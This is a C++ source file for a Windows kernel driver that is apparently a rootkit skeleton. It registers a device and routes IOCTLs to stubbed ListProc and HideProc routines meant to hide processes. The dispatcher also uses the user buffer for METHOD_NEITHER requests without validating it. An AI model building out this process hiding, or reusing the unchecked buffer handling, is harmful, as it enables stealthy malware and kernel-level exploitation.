extern "C"
{
	#include "ntddk.h"
}

#include <wdm.h>

#include "drv.h"
#include "ioctldef.h"
#include "rtk.h"

PDEVICE_OBJECT deviceObject;

extern "C" NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT driverObject, 
	IN PUNICODE_STRING registryPath
)
{
	UNICODE_STRING uDeviceName, uDeviceLinkName;
    RtlInitUnicodeString(&uDeviceName, deviceName);
    RtlInitUnicodeString(&uDeviceLinkName, deviceLinkName);

    NTSTATUS status = IoCreateDevice(
		driverObject, 
		0, 
		&uDeviceName, 
		FILE_DEVICE_RTK, 
		0, 
		TRUE, 
		&deviceObject
	);

	if(!NT_SUCCESS(status))
	{
        DbgPrint("rtk: failed to create device");
        return status;
	}

	status = IoCreateSymbolicLink(&uDeviceLinkName, &uDeviceName);

	if(!NT_SUCCESS(status))
	{
		IoDeleteDevice(driverObject->DeviceObject);
        DbgPrint("rtk: failed to create symbolic link");
        return status;
	}

	for(int i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
         driverObject->MajorFunction[i] = OnIrpDispatch;

	driverObject->DriverUnload = (PDRIVER_UNLOAD)OnUnload;
    
	DbgPrint("rtk: loaded");

	return status;
}

extern "C" NTSTATUS OnUnload(IN PDRIVER_OBJECT driverObject)
{
	if(NULL != driverObject->DeviceObject)
	{
	    UNICODE_STRING uDeviceLinkName;
		RtlInitUnicodeString(&uDeviceLinkName, deviceLinkName);
		IoDeleteSymbolicLink(&uDeviceLinkName);

		IoDeleteDevice(driverObject->DeviceObject);

		DbgPrint("rtk: unloaded");
	}

	return STATUS_SUCCESS;
}

extern "C" NTSTATUS OnIrpDispatch(PDEVICE_OBJECT deviceObject, PIRP irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(irp);
    PVOID inputBuffer = irp->AssociatedIrp.SystemBuffer;
    ULONG inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    PVOID outputBuffer = irp->AssociatedIrp.SystemBuffer;
    ULONG outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
    ULONG ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

    switch (irpStack->MajorFunction)
	{
		case IRP_MJ_DEVICE_CONTROL:
			if(METHOD_NEITHER == IOCTL_TRANSFER_TYPE(ioControlCode))
				outputBuffer = irp->UserBuffer;
			status = RtkDeviceControl(
				irpStack->FileObject, 
				TRUE, 
				inputBuffer, 
				inputBufferLength, 
				outputBuffer, 
				outputBufferLength, 
				ioControlCode, 
				&irp->IoStatus, 
				deviceObject
			);			
			break;
	}

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return status;
}

extern "C" NTSTATUS RtkDeviceControl(
    IN PFILE_OBJECT fileObject, 
    IN BOOLEAN wait,
    IN PVOID inputBuffer, 
    IN ULONG inputBufferLength, 
    OUT PVOID outputBuffer, 
    IN ULONG outputBufferLength, 
    IN ULONG ioControlCode, 
    OUT PIO_STATUS_BLOCK ioStatus, 
    IN PDEVICE_OBJECT deviceObject 
    ) 
{
	ioStatus->Status = STATUS_SUCCESS;
    ioStatus->Information = 0;

    switch(ioControlCode) 
	{
		case IOCTL_RTK_LISTPROC:
			DbgPrint("rtk: list processes");
			
			// TODO: list processes
			ListProc();
			
			break;
		case IOCTL_RTK_HIDEPROC:
			DbgPrint("rtk: hide process");

			// TODO: hide process
			HideProc();

			break;
		default:
			ioStatus->Status = STATUS_INVALID_DEVICE_REQUEST;
			break;
	}

	return ioStatus->Status;
}
